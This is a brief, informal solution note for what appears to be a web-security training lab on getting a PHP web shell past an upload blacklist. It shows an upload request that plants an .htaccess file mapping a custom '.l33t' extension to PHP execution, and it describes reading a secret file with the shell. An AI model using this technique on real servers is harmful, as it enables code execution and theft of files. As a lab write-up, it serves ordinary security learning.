Lab: Web shell upload via extension blacklist bypass

 This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

we need to create a conf file 


Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t


we add a permision to upload .l33t files

then we just add the .l33t fyle and get the secret
